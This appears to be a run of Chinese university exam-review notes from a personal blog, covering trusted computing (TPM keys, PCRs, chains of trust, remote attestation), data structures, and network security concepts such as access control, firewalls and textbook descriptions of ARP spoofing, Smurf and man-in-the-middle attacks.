可信计算的发展阶段：硬件可信阶段、综合可信阶段、深入发展阶段。 可信机制分为可信度量机制、可信存储机制、可信报告和可信认证机制。 一个CA创建的凭证通常称为：认证密钥证书 可信计算的核心问题可以归结为：信任问题 在可信计算平台中，一般有24个PCR寄存器。每个寄存器都存储特定的散列值0到7用于系统启动，8到15给操作系统使用，16到23用于动态可信根的建立 Diffie-Hellman算法是第一个公钥算法。 信任链分为动态信任链和静态信任链。 平台身份证明分为Privacy CA方案和DAA方案。 CA是PKI的核心执行机构，是PKI的主要组成部分，业界人士通常称他为认证中心 。 信任链的核心和起点是 计算机可信根 。 数字证书是将证书持有者的身份信息和其所拥有的公钥进行绑定的文件。 身份信任采用静态验证机制，常用的技术包括认证、授权、加密等。 在TSS结构体系中，TPM设备驱动库（TDDL）以用户模式运行。 可信计算平台通用体系架构分为3个层次：基础硬件层、可信服务层、安全应用层。 公钥基础设施(PKI):是一个用**非对称密码算法（或公钥密码)**原理和技术来实现并提供安全服务的、具有通用性的安全基础设施。 TPM安全管理密钥的生成、使用和存储，包括背书密钥、存储密钥、签名密钥、身份证明密钥、绑定密钥、继承密钥、验证密钥。 TPM可信平台模块，本身是一种SOC芯片，是可信计算平台的信任根。 判断题 信任可以分为身份信任和直接信任两部分。（×） 每个TPM拥有唯一的EK 。 （√） 可信机制是保障可信计算平台安全可行的机制。（√） 一个实体如果它的行为总是以预期的方式，达到预期的目标，则这个实体就是可信的。 （√） 可信强调行为结果可预期，但并不等于确认行为是安全的。（√） TPM密钥的签名密钥是对称密钥。 （ × ） 远程证明是通过“挑战”-“应答”协议来实现的。 （ √ ） 公钥基础设施时刻一个用非对称密码算法原理和技术实现的、具有通用性的安全基础设施。（√ ） TSS模块中，TSP（可信服务提供者）的功能是提供公共服务的集合。（×） （正确功能应该是本地和远程的可信代理，位于书P51） 考点第一章（重点）可信计算的定义： 一个实体如果它的行为总是以预期的方式，达到预期的目标，则这个实体就是可信的。 清楚它的启动过程： 要看第一章宏观的这些基本知识 第二章（重点）TPM概述： TPM可信平台模块是一项安全芯片的国际标准，旨在使用设备中集成的专用微控制器安全硬件处理设备中的加密密钥。 是带密码运算功能的安全芯片，通过总线与PC芯片连在一起 可信： TCG基于标识平台的硬件和软件组件的方法来构建平台可信的安全机制。TPM提供收集和报告这些标识信息（身份信息）的方法。 安全芯片： 有效地保护PC、防止非法用户访问。 具有产生加解密密钥的功能 充当保护BIOS和操作系统不被修改的辅助处理器 TPM包含哪些模块，有什么功能？（P18） 输入&#x2F;输出：处理通信总线数据流。 非易失性存储器：用来存放EK、SRK、所有者的授权数据和永久标识。 PCR：平台配置寄存器，是用来记录系统运行状态的寄存器，是TPM的核心器件。 AIK：永久不变 程序代码：用于测量平台设备的固件。 随机数发生器：用于密钥的生成，产生nonce和增强口令访问的熵 SHA-1加速器：用于计算数字签名，产生密钥段和其他常规应用。 RSA密钥产生器：产生签名和存储密钥。 RSA加速器：使用签名密钥进行数字签名，用存储密钥进行加密和解密。 选择进入：确定物理存在状态的逻辑和接口，确保应用到其他TPM部件的禁用操作是否被执行。 执行引擎：执行程序代码，完成TPM的初始化和测量操作。 TPM有哪些密钥？（P24） 背书密钥EK： 证明平台可信，对TPM来说，是唯一的标识。 是一个2048比特的RSA公私钥对。 不用做数据的加密和签名。 非迁移的解密密钥。解密所有者的授权数据和产生AIK相关数据。 身份证明密钥（AIK）： 代替EK，来提供平台的证明。 存储根密钥（SRK）（可信存储根）： 拥有最高权限的Storage Key SRK私钥驻留在TPM内部，不被导出 由它来之间或间接的加密保护后续生成的密钥 签名密钥： Signing Key 非对称密钥，用于信息和数据的签名 可迁移和不可迁移都行 绑定密钥： BindingKey加密保护TPM外部的任意数据 可迁移 继承密钥： Legacy Key 既可以用于签名也可加密 用在平台间传递数据的场合 验证密钥： Authentication Key用于保护运用TPM完成的传输会话。 多个TPM间、普通PC和有TPM平台的远程通信的数据段，进行对称加密 AIK和EK有什么关系？ EK：TPM唯一标识。 AIK：AIK密钥是EK密钥的替代者，利用AIK密钥可以进行签名与加密等操作 关系：AIK可以看作是EK的“别名”，EK只有一对，但EK可以对应多对AIK。 为什么有了EK还要AIK？ 为保证EK的安全，避免使用EK。EK是重要的私有信息，用EK加密或签名数据，攻击者可能会从被加密的数据中获取EK的相关信息而攻击TPM，平台身份密钥AIK由此产生（Attestation Identity Key） 公钥加密算法（P22） 公钥算法在可信计算里扮演着什么样的角色？ 公钥密码算法克服了对称密码的缺陷，能够通过公开的信道进行密钥交换。 公钥算法是谁提出的？ Diffie和Hellman于1976年提出，其安全性源于有限域上计算离散对数困难性问题。 第一个公钥算法？ Diffie-Hellman算法。 公钥和私钥的作用？ 私钥签名，公钥验证签名。 私钥解密，公钥加密。 第三章可信根概念： 可信根是信任基点，是信任链的核心，是所有系统行为完整性的测量基础。 如何建立信任？如何衡量信任？ 信任链的传递机制：从可信根出发，每一次平台转换信任关系都可以通过传递的方式保持下去不被破坏，那么平台上的计算环境始终是可信的，在该环境下的操作也不会破坏平台的可信。平台本身的完整性得到保证，终端安全也得到保证。信任链的起点，可信根。 如何把信任传递下去？（信任链） 从可信根开始，通过完整性度量和完整性存储技术对代码的可信赖性进行度量和记录，实现信任的链式传递，并扩大到整个系统。之后利用完整性报告技术实现从终端到网络的传递。 可信根分为三个类型，了解这几个可信根，知道它们代表什么意思，什么作用，有什么功能？ 可信度量根（RTM）：用于生成固有的可依赖的完整性度量值的计算部件，可测量任何用户定义的平台配置。 可信存储根（RTS）：完成密钥管理、密钥产生、加密、解密 可信报告根（RTR）：允许受TPM保护的区域中的数据可以被验证通过的需求者获取（非易失性内存+PCR）。PCR数据的真实性需要RTR用签名密钥签名证实。 可信传递可信根确认下一级的可信度，下一级若是可信的，则可信范围从可信根传递到下一级。以此类推，过程重复，实现可信系统可信范围的延伸。 根据PC启动的过程传递。 可信度量对代码程序及其相关配置的完整性验证。 生成hash值，把hash传到PCR里 可信度量完整性分为两方面： 第一方面：静态可信度量：完整性基准值的建立。 信任链的建立： 获得可信认证中各阶段的认证 把基准值存到安全区域 启动过程中，如有信息更改，需要重新计算基准值 静态的特点： 发生在系统引导阶段，BIOS、操作系统装载器、操作系统顺序比较固定，是一个单一链式过程。 第二方面：动态可信度量：完整性认证，实现可信传递的过程。 完整性认证过程是通过对实体计算结果和生成的完整性基准值相比较。 信任链信任链有动态静态之分，要区分它们，各自指的是什么？有什么优缺点？ 静态： 从终端加电至操作系统装在的静态可信认证。 优点：无法攻击，无法通过重置、回溯手段篡改信任链 缺点： 一旦平台进入不可信状态，平台以后的所有状态都不可信，并且无法回到可信状态。 只能保证加载时软件的完整性,无法保证运行时的完整性,无法抵御运行时的攻击 软件数量巨大并且具有不同的版本,需要巨大的特征数据库支持。 动态： 从操作系统至应用程序的动态可信认证。 优点：程序隔离。即使系统不可信，敏感代码也能安全执行 缺点：硬件限制 动态信任链怎么运作的？ → 应用程序调用DRTM，指明要保护的内存地址 → CPU禁止DMA访问该地址段，禁止中断、debug命令 → 将程序载入CPU缓存并锁定缓存 → 设置PCR为-1 → 将缓存中的代码发到TPM进行度量并扩展完整性到PCR17 PCR一个TPM里有几个PCR，功能是什么？ PCR：平台配置寄存器，是用来记录系统运行状态的寄存器，是TPM的核心器件。 TPM1.1 版 有16个PCR。不同PCR保存不同模块的完整性。 传递的过程，不同PCR负责不同步骤的hash PCR[0]:CRTM,BIOS和平台扩展 PCR[1]:平台配置 PCR[2]:ROM 代码(可选) PCR[3]:ROM 配置和数据(可选) PCR[4]:初始化装载代码(通常为主引导区) PCR[5]:初始化装载代码配置和数据 PCR[6]:状态转换 PCR[7]:保留 信任链的应用？ 基于静态可信根的信任链应用系统 基于动态可信根的信任链应用系统 信任链远程证明技术 云计算环境下的信任链应用系统 具体过程 启动计算机,开始运行 CRTM; CRTM 开始度量 BIOS的完整性,并保存其度量基准值,随后把控制权交给 BIOS; BIOS随即初始化,并开始度量主引导区的完整性,保存度量基准值,装入主引导区,随后把控制权交给主引导区; 主引导区度量 OS加载器的完整性,保存度量基准值,装入 OS加载器,随即把控制权交给OS加载器; OSLoader度量 OS的完整性,保存度量基准值,装入 OS,随即把控制权交给 OS; OS度量 Application的完整性,保存度量基准值,装入 Application,随即把控制权交给Application; 应用软件 Application运行。 会画，会解释，文字要记住，步骤也要明确，描述用语准确。 第四章可信软件栈，类似小型的操作系统 TSS体系结构？ TPM → 设备驱动程序 → 设备驱动程序接口 → 核心服务 → 核心服务的接口 TPM2.h位于体系结构的哪一层？ TSPI的上层，程序调用的是TSPI。 TSS是可信软件栈，不包括TPM，因为它是硬件 TSS分成两种模式 内核模式：操作系统的设备驱动程序和核心组件驻留的地方。 （该区域下的代码用于维护及保护用户模式下运行的应用程序。） 用户模式：用户应用程序和服务执行的地方。 远程证明（P62） 大概看下两个协议，privacy CA、DAA 挑战应答 第五章（了解一下）可信计算平台？ 软硬件结合的实体 可信计算平台的体系架构？ 基础硬件层、可信服务层、安全应用层 可信机制？（P73） 可信度量机制：平台完整性度量机制，负责度量平台状态的完整性信息，并按照特定的方法和步骤进行对比和报告。 可信存储机制：可信存储机制负责保证基准信息、度量信息以及摘要信息、核心数据的可信存储与访问。 其主要思想就是通过密钥进行数据保护。 可信报告机制：提供证据证明远程用户身份和平台可信性 可信认证机制：提供证据证明远程用户身份和平台可信性 可信平台的应用？ 虚拟可信计算平台 移动可信计算平台 第六章（稍微了解一下）第七章（重点）完整性度量 是TPM&#x2F;TCM安全芯片获取平台软硬件可信度特征值的过程，通常这些值以摘要的形式扩展存储到安全芯片的 PCR 中 平台身份密钥引证 AIK专门用于远程证明，TPM 远程证明的签名过程也被称为平台身份密钥引证 协议模型 证明过程，分为三个阶段：完整性度量，完整性报告，完整性证明 远程证明使用的是挑战应答协议。 基于AIK的远程证明模型 AIK远程证明的流程解释（对下图的解释） Privacy CA 下图会画，会解释&#x2F;主要步骤的文字描述 平台身份证书颁发 平台身份认证 身份证书颁发 TPM生成RSA签名密钥AIK，然后将EK证书、平台证书、一致性证书、AIK公钥打包。 将这些数据作为AIK证书申请请求发送给可信第三方 可信第三方privacy CA通过对EK证书、平台一致性证书等，验证请求是否有效 使用签名密钥对AIK证书进行签名，并用Ek的公钥进行加密 将AIK证书应答数据报返回给TPM，并通过接口命令来解密获得AIK证书 平台身份认证 平台A向平台B发送证明请求 平台B向A发出挑战随机数，同时指明需要证明PCR 平台A加载AIK密钥，使用私钥对PCR签名 A将远程证明签名和平台配置完整性日志发给B B请求privacy CA，查询平台A的TPM身份是否可信 A的TPM身份可信，则B验证A的签名及平台配置完整性有效 DAA和privacy CA比较，优缺点。DAA怎么运作的？有了privacy CA为什么还要DAA？ Privacy CA : 可信第三方基本远程证明协议，负责颁发可信计算平台的身份密钥证书，并提供有效性的验证。 DAA：匿名证明TPM身份，TPM不需要可信第三方帮助的情况下，直接向远程验证者认证可信计算平台的真实性和可信性。 因为privacy CA可信第三方完全知道TPM的真实身份，如果验证方和可信第三方串谋，TPM身份隐私没有保证。另外每次认证时，验证方都需要查询可信第三方。 DAA远程运作的流程？ 描述流程和步骤，会画图 TPM通过密钥生成器产生一对RSA密钥，通过EK向DAA发布者提供身份合法性 凭证颁发者通过EK，给TPM一个验证证书 TPM生成一个AIK，并用从Issuer获得的证书签名发给验证方，验证方受到attestor发来的信息后，将attestor提供的签名和公钥进行可信验证 平台的完整性证明（了解概念） 基于二进制的远程证明 TPM&#x2F;TCM 安全芯片直接证明用二进制 Hash值表示的平台完整性值 基于属性的远程证明 基 于 属 性 的 远 程 证 明 (PB A ,Property - based At testation )是 一 种 在 从 平 台 的 配 置 可 以 转 换得到平台属性的基础上,由可信第三方提供属性证书,来证明被证明方的组件满足某个或某 些属性的远程证明机制 远程证明的应用 数字版权管理DRM、移动手机平台、可信信道构建、可信网络接入、云计算节点验证 第八章（比较重要）NAC技术框架？ C-NAC技术？ 现有技术的缺陷？ 互操作和可扩展性差 容易受到伪造状态行为的攻击 缺乏接入后控制 TNC的架构？ 会画，会描述。描述好总的架构知识，不需要特别细致 TNC的工作流程（8.2.3） 看明白就好 在开始接入网络之前,TNCC使用平台专用的绑定工具载入平台相关的IMC,并且对IMC执行初始化操作。与此类似,TNCS则载入相关的IMV 并初始化。 当一个网络连接尝试开始触发,AR上的 NAR就会向 PEP发送连接请求。 收到来自 NAR的连接请求后,NAR会发送一个网络访问决策请求到 NAA。 NAA 一般为网络接入3A 认证服务器,如RADIUS和Diameter。在服务器完成用户身份认证后,NAA通知 TNCS有新的连接请求。 TNCS和 TNCC之间进行平台证书的鉴别。 平台身份验证成功之后,TNCS通知IMV 有新的连接请求,TNCC通知IMC有新的连接请求,IMC向TNCC发送一定数量的IMC-IMV 消息。 PDP对 AR的完整性进行验证,有3个子步骤: 为了完成一次完整性检查握手,TNCC和 TNCS交换完整性验证的相关信息,这些信息在NAR、PEP 和 NAA 之间转发,直到 TNCS 认为 TNCC 发送 的 完 整 性 验 证 信 息 满 足需求。 TNCS将每个IMC收集的完整性信息发送给对应的IMV,IMV 会对IMC消息进行分析,如果IMV需要更多的信息,那么它会通过IF-IMV向 TNCS发送完整性请求消息;如果IMV 完成了验证,则通过IF-IMV 接口发送结果到 TNCS。 TNCC通过IF-IMC把来自 TNCS的消息传递给相应的IMC,并且把来自IMC的 消息发送给TNCS。 TNCS完成和 TNCC的完整性握手之后,TNCS将网络接入决策发送给 NAA。 NAA 将网络接入决策发送给 PEP,PEP根据接入决策实施网络访问控制,并将最后的接入结果返回给 AR。如果 AR没有满足完整性验证,TNCS可以将这个 AR隔离到修复网络,在修复网络中通过完整性修复后可以重新发起连接请求。 第九章信任的定义？分类？ 定义：任表征对实体身份的确认和对其本身行为的期望,一方面是对实体的历史行为的直 接认知,另一方面是其他实体对该实体的推荐。信任可以随实体行为动态变化且随时间延续而衰 减。信任强调可预测性。 分类：身份信任、行为信任 常见的身份信任有什么方法？（P136） 认证、授权、加密、数据隐藏、数字签名、公钥证书、访问控制 有了身份信任，为什么还要行为信任？ 大量的计算资源的介入将导致无法直接在各个实体间建立事先的信任关系 原先信赖的用户或资源也可能变得不可信 信任关系的划分？ 多种划分方式。 身份信任行为信任。 域内信任、域间信任。 直接信任、反馈信任。 可信管理（P142，9.2.1） 概念，了解定义 信任管理的定义：采用一种统一的方法描述和解释安全策略、安全凭证以及用于直接授权关键性安全操作的信任关系。 主要研究内容？ 制定安全策略、获取安全凭证、判断安全凭证是否满足相关的安全策略。","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"可信计算","slug":"期末考试/可信计算","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"数据结构期末考点","slug":"数据结构期末考点","date":"2021-01-21T15:09:18.000Z","updated":"2024-11-12T07:00:04.000Z","comments":true,"path":"2021/01/21/数据结构期末考点/","permalink":"https://gryffinbit.top/2021/01/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"数据结构期末考点 本文章notion版本链接（格式更好看一些）：https://www.notion.so/gryffinbitworkspace/5dbf3d58c5404a99bcaaba96cc42f58a 本文章PDF版本链接：https://gryffinbit.lanzous.com/i4duqknlove 数据结构期末考试考点，相关的附件：https://gryffinbit.lanzous.com/iTWTpknltyh 线性表线性表及链表的添加、插入、删除（重点是指针的位置变化问题） 题 $Loc_{ai}&#x3D;Loc_{a1}+(i-1)*l$ 队列与栈队列与栈的概念及基本操作（考选择题） 基本概念 栈后进先出 2比1后进，应该先出 数组和串数组和串的基本概念（有两个左右的选择题） 广义表长度：表中所含元素的个数。深度：括号的层数 树掌握树、二叉树、满二叉树、完全二叉树的相关概念，树转化为森林的方法。（这一张是考试重点，会有多种类型的考题） 重点掌握 二叉树的5个性质: $叶子节点数： n_0 &#x3D; n_2 + 1$ $第k层上，至多有2^{k-1}个结点$ $高度为h的二叉树，至多有2^h-1个结点$ 结点i所在层次 n个结点的完全二叉树高度 树的几种遍历方法：按某条搜索路径访问树中的每个结点，树的每个结点均被访问一次，而且只访问一次 先序遍历：根，左子树，右子树 NLR ![44](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;数九结果&#x2F;数据结构 da568407752248e985256042f6aeeec2&#x2F;44.png) 中序遍历：左子树，根，右子树 LNR 后序遍历：左子树、右子树、根 LRN 层次遍历：从上至下，从左至右 哈夫曼树的构造及编码规则 平衡二叉树的构建 相关概念 树二叉树满二叉树 完全二叉树 左边是完全二叉树，右边是满二叉树。 只有最后一层，没有满。 树转化为森林的方法 题 $n&#x3D;n_0 +n_1+n_2$ $n_0&#x3D;n_2+1$ 最后一个分支结点序号 &#x3D; 结点&#x2F;2 向下取正 叶子结点个数 &#x3D; 总结点数 - 最后一个分支结点序号 $n_1$只有两种可能 0 或1 $结点固定，h范围： log_2最大结点数（向下取正） + 1 ～ 最大结点数$ $深度为h的满m叉树，结点个数 m^h-1, 第k层的结点数为m^{k-1}$ 分支数为B，结点数为n $n&#x3D;B+1$ $B&#x3D;度数*数量$ $哈夫曼树只有n_0和n_2结点$ $完全二叉树 n &#x3D; n_0+n_1+n_2 且 n_1&#x3D; 0\\ or \\ 1$ 图有向图，无向图，连通图的基本概率，图的邻接矩阵表示方法，图的遍历方法（深度遍历和广度遍历），最短路劲算法和关键路劲的算法； 最小生成树算法：Prim算法及Kruskal算法的概念； 最短路径算法：Dijkstra（迪杰斯特拉）算法（要求理解该算法的程序代码） 关键路径算法的求解 图的基本概念 一个图中，所有顶点度数之和 &#x3D; 边数 * 2 有向图中，所有顶点出度之和 &#x3D; 入度之和 n个顶点的有向图，最多n(n-1) 条边 n个顶点的连通图，用邻接矩阵表示，最少要有2(n-1)个非零元素 题 行为出度，列为入度。各顶点度是行列非零元素之和。 关键路径：从源点到汇点带权路径最长的 线性表重点掌握：线性表的顺序查找、折半查找和分块查找的概念 二叉排序树的查找、创建、插入、删除方法； 平衡二叉树的调整的4种方法； 堆排序（掌握如何建堆的过程）； 堆排列 小根堆，子树比根大 大根堆，子树比根小 顺序查找 对无序线性表进行顺序查找，查找失败时要遍历整个线性表 有序查找进行顺序查找，失败时不一定要遍历整个线性表 失败结点有n+1个 折半查找 仅适用于有序顺序表 计算平均查找长度： ASL成功：第一层有一个结点，第二层两个结点，第三层三个 ASL失败：没有给出具体失败例子，以失败结点为单位，有12个失败结点。4层有4个失败结点，（4-1）*4 5层有8个失败结点，（5-1）*8 分块查找 命名：最大标号。 查找的时候，和标号比较 块内元素无序，块间有序 注意是，均匀分配b块 平衡二叉树的调整（4种方法） LL平衡旋转（右单旋转） H代表层数 RR平衡旋转 LR平衡旋转 RL平衡旋转 ![120](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;数九结果&#x2F;数据结构 da568407752248e985256042f6aeeec2&#x2F;120.png) 概念题 题 中间的为根，然后分为左右两部分，再取中间的为根，以此类推，且确定了根后，处在前面的是后面的根，比如3，4的位置。或者前面是左子树。这种顺序 关键字结点排序，比较大小，小的左子树，大的右子树 排序 基本概念 题 快速排序，左标记的值大于基准点时，且右标记移动到比基准值小时，左右两边交换。 左右两个标记重合时，那个值与基准点进行交换。这样就分为了，标记值左边是小于基准值的，右边是大于基准值的 小根堆 按层次排序把这个序列排成二叉树 大根堆 先无序排成二叉树，然后从底层开始交换顺序。根比孩子都大 算法掌握起泡排序（要求理解该算法程序代码），直接插入排序（懂得原理）、希尔排序（懂得原理）、快速排序（懂得原理）；","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"数据结构","slug":"期末考试/数据结构","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"网络安全技术期末考点","slug":"网络安全技术期末考点","date":"2021-01-20T17:06:34.000Z","updated":"2024-11-12T07:00:03.000Z","comments":true,"path":"2021/01/21/网络安全技术期末考点/","permalink":"https://gryffinbit.top/2021/01/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"考点填空题（15） 网络安全目标 机密性、完整性、可用性、合法性 网络安全威胁 Impersonation冒充：伪造他人身份 Replay重放：把合法的信息重新发一遍 Denial of Service拒绝服务攻击 强制访问控制 最高秘密Top Secert &gt; 秘密Secret &gt; 机密Confidential Land攻击 相同的目的IP地址和源地址，loop死锁 传输层的套接字： 工作在运输层 PKI的目标： 身份认证、信息完整性、不可抵赖性 数字证书含有： 有效期限、颁发者身份、数字证书算法（如何为它签名的RSA、Hash、Sha256等） sesion Key ： 会话密钥 GSM认证 导致伪基站的产生的原因：用户对基站的证明是单向的 （用户向基站证明自己是合法用户，而基站不会向用户证明） VPN “虚拟”的专用网。 优势：安全、低成本、可扩展、可管理 选择题（10） 抵抗重放攻击 一次一密 死亡ping 在目的端重组IP分片，形成超大IP数据包，超过最大尺寸导致缓冲区溢出。 抵抗中间人攻击： 数字签名 密码协议的种类 密码建立协议 认证协议 可认证密钥建立 没有一次一密 企业根CA需要活动目录技术支持（独立根证书不需要） 网络加密 链路加密、结点加密、端到端加密 （不是网络加密的是？） 可信的密钥分发中心 性能和安全的瓶颈 动态包过滤： （按需） 监控数据包交换并且根据需要来进行有效控制通信 判断题（5） kerberos协议： 可认证的票据，使用的是对称加密，而不是公钥加密 可信的密钥分发中心： 性能和安全的瓶颈 简答题（4道）ARP原理，ARP欺骗 ARP：地址解析，在局域网中，将IP地址转换成MAC地址 ARP欺骗：通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。 🌻 修改数据包中的目的MAC地址，攻击者将被攻击者的MAC地址替换成自己的MAC地址 ICMP反弹Smurf攻击 使用将源地址设置成受害网络的广播地址的ICMP应答请求（ping）数据包，来淹没受害主机，最终导致该网络的所有主机都对此ICMP应答请求做出答复，导致网络阻塞。 ICMP回显泛洪攻击 发送假冒ping数据包，其中： 源地址设置为受害者的IP地址 目的地址设置为子网的广播地址（向整个局域网传播） 如此，ping回显数据流堵塞，耗尽被攻击者的带宽，无法提供正常服务，进而拒绝服务。 桥接或仅主机网卡的虚拟机不能和同子网的宿主机获得ping回显，为什么？ 因为ICMP回显请求在防火墙中没有被启用 防火墙 防火墙的概念： 在内部专用网络和公共网络之间 丢弃数据包： 不予处理并且无响应消息 静态的包过滤系统： NAT保护内部计算机不受外部攻击 防火墙分为： 电路级网关 2. 应用层网关 3. 包过滤技术（静态和动态） 应用级网关在OSI模型中的应用层过滤数据，电路级网关在会话层，包过滤技术在网络层 综合大题（2道）如何保证完整性和机密性？ 完整性：web服务器 底层信息流上不去。用户：低级。web服务器：高级 不下读：阻止坏信息从较低完整性等级向上流（服务器拒绝读坏信息） 不上写：阻止坏信息从下方流向较高完整性等级（不能向服务器写坏信息） 机密性：防火墙 高层信息流不下来。防火墙内部：高级。防火墙外部：低级 不上读：阻止好信息从较高机密级别向下流（防火墙外无法访问防火墙内） 不下写：阻止好信息从上方流向较低机密级（防火墙内无法写出防火墙外） 中间人攻击？ 在没有察觉的情况下，攻击者拦截被攻击者的通信，劫持发送方的消息替换并且转发给接收方。如此，通信双方认为自己已经和对方完成密钥协商，但是实际上是各自和攻击者进行了密钥协商。 用数字签名和公钥绑在一起发送，抵御中间人攻击 联锁协议（互锁协议，interlock protocol）抵抗中间人攻击 可以挫败双方密钥交换时的中间人攻击。 安全特性：仅有加密消息的一半无法解密 过程： 如果尝试拦截会话，敌手既无法解密A发送消息密文的一半，又无法使用B的公钥重新加密一半的消息 敌手不得不等待接收到两个完整的密文，然而这个时候B已经可以使用自己的私钥来解密这个消息 B成功获取到A的正确消息，后续将直接丢弃敌手的消息 补充笔记第一章信息安全4个基本目标 保密性 不被泄露 完整性 数据一致性 可用性 合法用户不会无故被拒绝 合法使用 不被非授权使用、不被非授权的人使用 安全威胁来源 信息泄露 完整性破坏 拒绝服务 非法使用 主要可实现威胁 假冒 未授权实体盗取合法用户的权利和特权 旁路控制 为获取非授权的权限，发掘系统缺陷或漏洞，绕过守卫者的防线 授权侵犯 有授权的人，将其权限用于非授权的目的，通常称为内部攻击 特洛伊木马 含有不易察觉的或无害程序段，执行的时候会破坏用户安全性 陷门 在系统或其部件设置机关，在输入特定的数据时，允许违反安全策略 截获&#x2F;修改 某一通讯数据，在传输中被改变、删除或替换 消息重发 对所截获的某次合法的数据备份，出于非法目的重新发送该数据 业务否认 参与某次通讯交换的一方，事后否认曾经发生过此次信息交换 流量分析 对通信流量进行观察，可能泄露机密信息 安全防护措施 物理安全 环境的安全、物理的访问控制措施、设备防篡改等 人员安全 岗位划分 管理安全 对设备进行管理、泄露信息事件的追查、审计 媒体安全 对受保护信息的存储、磁盘的销毁 辐射安全 射频等其他电磁的控制 生命周期控制 对系统的设计、安全评估、记录和日志进行控制 访问控制策略（安全策略）自主性访问 Who and When访问控制列表、文件授权 允许用户自主在系统中规定谁可以取它的资源 基于身份 基于任务 强制性访问 用户的权限和客体的安全属性固定，安全属性由管理员设置，用户不能修改 客体访问限制：根据客体信息的敏感标记和访问主体的访问等级 客体：各种设备等 多等级访问 基于角色访问控制 会因为不同的作业功能产生不同的角色，执行某项操作的权限会被赋予特定的角色 一个主体可以有多个角色，一个角色也可以分配不同主体。关注角色、用户、权限的关系 运行方式：角色继承。 受限继承关系：一个角色只能直接继承另一个角色资浅的角色权限 间接继承：不受限制 一般继承关系：一个角色能直接继承多于一个资浅角色的权 安全攻击的分类被动攻击 对传输信息的窃听和监测 信息泄露 流量分析 主动攻击 伪装攻击 某个实体伪装成另外的实体，将获取的认证信息重放，以获得某实体的权限 重放攻击 将获得的信息再次发送，以在非授权的情况下进行传输 消息篡改 修改或延迟消息传输，达到非授权的目的 拒绝服务 破坏某个网络使其瘫痪或过载以降低性能。 Dos 过度使用服务，使软件硬件过度运行，网络连接超出其容量 造成关机或系统瘫痪或降低服务质量 DDos（分布式拒绝服务攻击） 使用多个internet主机同时向一个目标发起攻击 减轻攻击强度措施 过滤不良数据包 追查关闭攻击站点 提高接收数据处理、增加硬件和网络扩容 网络攻击常见形式口令窃取 已知 字典攻击 窃听合法终端间的会话 欺骗攻击 社工欺骗 缺陷和后门 蠕虫病毒 向守护程序发送新的代码，向缓冲区注入大量数据，直到gets堆栈中的返回地址覆盖，则返回时会执行入侵者的代码 缓冲区溢出攻击 缺陷：程序中的某些代码不能满足特定的要求 认证失败 源地址有效性的验证机制，在某些场合可以发挥作用，但是如果黑客攻击欺骗了地址，让消息看起来好像来自本地，这样就躲过了攻击 协议缺陷 信息泄露 指数攻击 病毒和蠕虫 安全服务 认证 确保通信实体就是他们所声称的实体 访问控制 防止非授权的访问 数据保密性 保护数据，防止非授权的泄露 数据完整性 保证收到的数据不被删除、插入、重发、修改 不可否认性 确保通信一方没有否认的行为 作业 信息安全的3个基本目标是： 保密性、完整性、可用性、合法使用 网络中存在的4种基本安全威胁: 有信息泄露、完整性破坏、拒绝服务、非法使用 X.800定义的5类安全服务： 认证、访问控制、数据保密性、数据完整信息、不可否认性 X.800定义的8种特定的安全机制是： 加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制、公证 简述通信安全、计算机安全、网络安全之间的联系与区别 网络安全：双方共同使用通信协议来建立逻辑信息通道，保护信息传输以防止攻击者威胁消息的保密性、完整性、真实性。 安全模型（由6个功能实体组成）：消息发送方（信源）、消息接收方（信宿）、安全变换、信息通道、可信第三方、攻击者 通信安全：在发送的过程中，保证消息能够安全到达，不被截获、篡改、替换。 计算机安全：信源、信宿自己的计算机不被恶意代码攻击 在选课系统中，存在教师、学生、管理员3类用户。需要适时进行系统访问、数据输入和管理。采用自主访问控制、强制访问控制和基于角色访问控制，可以使用的有哪些？哪一种时间和存储成本较低？ 自主访问控制是可以由用户自主的决定谁可以访问它的资源。 强制访问控制是只能按照已经规定好的权限去访问。 基于角色访问，是执行某项操作的权限会被赋予特定的角色。 管理员可以使用自主访问控制，便于进行资源的分配和管理，以及权限的设定。 教师可以是基于角色访问，被赋予一定的权限，进行数据的输入。 学生采取强制访问控制，只能按照已经设定好的权限，来对选课系统进行访问。 基于角色的访问控制时间和存储成本比较低。根据选课需求和后续功能增加等问题，基于角色的访问控制会更灵活，应用范围更广。 第二章TCP&#x2F;IP协议族网际协议（internet protocol，IP）是TCP&#x2F;IP协议族的核心 网络接口层（数据链路层、物理层） TCP&#x2F;IP模型的最底层 网际层（网络层） IP协议 网际协议（internet protocol，IP）是网际层最重要的协议 传递中易被监听、窃取。 应该对IP数据报进行加密 IP层没有采取措施保证传递的正确性，可能会被修改数据报的内容。 应对数据报的内容采取完整性检查机制 IP欺骗攻击 源地址鉴别机制加以防御 Land攻击：通过发送精心构造的、具有相同源地址和目标地址的欺骗数据包，致使缺乏相应防护机制的目标设备瘫痪。 在数据报传输时分段重组的过程中，注入大量病态小数据报，影响包过滤器正常工作 